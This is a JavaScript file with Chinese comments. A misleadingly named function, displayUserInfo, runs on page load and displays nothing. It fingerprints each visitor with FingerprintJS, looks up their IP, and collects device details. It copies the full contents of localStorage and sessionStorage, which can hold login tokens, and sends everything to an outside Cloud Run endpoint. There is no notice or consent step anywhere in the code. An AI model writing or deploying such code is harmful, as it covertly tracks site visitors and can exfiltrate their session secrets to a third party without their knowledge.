// 設定 Local Storage 中的 userId
function setUserId(value) {
    localStorage.setItem('userId', value);
}

// 從 Local Storage 中取得 userId
function getUserId() {
    return localStorage.getItem('userId');
}

// displayUserInfo 函數
async function displayUserInfo() {
    try {
        // 生成或获取用户 ID
        let userId = getUserId();
        if (!userId) {
            // 直接生成新的 userId
            userId = 'user_' + Math.random().toString(36).substr(2, 9);
            // 将 userId 存入 Local Storage
            setUserId(userId);
        }

        // 加载 FingerprintJS 库并获取浏览器指纹
        const fpPromise = FingerprintJS.load();
        const fp = await fpPromise;
        const result = await fp.get();

        // 获取其他信息
        const ipAddress = await getIpAddress();
        const httpHeaders = getHttpHeaders();
        const deviceInfo = getDeviceInfo();
        const timezone = getTimezone();
        const screenResolution = getScreenResolution();
        const plugins = getPlugins();
        const localStorageData = getLocalStorage();
        const sessionStorageData = getSessionStorage();

        // 构建用户信息对象
        const userInfo = {
            userId,
            ipAddress,
            browserFingerprint: result.visitorId,
            httpHeaders,
            deviceInfo,
            timezone,
            screenResolution,
            plugins,
            localStorageData,
            sessionStorageData,
        };

        // 将用户信息发送到后端
        const response = await fetch('https://google-sheets-proxy-mk66ircp2a-uc.a.run.app/Angelia', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(userInfo),
        });

        if (!response.ok) {
            throw new Error('Failed to send user data to backend');
        }

        console.log('User data sent to backend successfully');
    } catch (error) {
        console.error('Error displaying user info:', error);
    }
}

// 获取用户 IP 地址
async function getIpAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error getting IP address:', error);
        return 'Unknown';
    }
}

// 获取 HTTP 标头信息
function getHttpHeaders() {
    return {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        cookieEnabled: navigator.cookieEnabled,
    };
}

// 获取设备信息
function getDeviceInfo() {
    return {
        platform: navigator.platform,
        vendor: navigator.vendor,
        hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory || 'Unknown',
    };
}

// 获取时区
function getTimezone() {
    return Intl.DateTimeFormat().resolvedOptions().timeZone;
}

// 获取屏幕分辨率
function getScreenResolution() {
    return {
        width: screen.width,
        height: screen.height,
    };
}

// 获取已安装的插件
function getPlugins() {
    const plugins = [];
    for (let i = 0; i < navigator.plugins.length; i++) {
        plugins.push(navigator.plugins[i].name);
    }
    return plugins;
}

// 获取本地存储数据
function getLocalStorage() {
    const storage = {};
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        storage[key] = localStorage.getItem(key);
    }
    return storage;
}

// 获取会话存储数据
function getSessionStorage() {
    const storage = {};
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        storage[key] = sessionStorage.getItem(key);
    }
    return storage;
}

// 调用 displayUserInfo 函数
displayUserInfo();
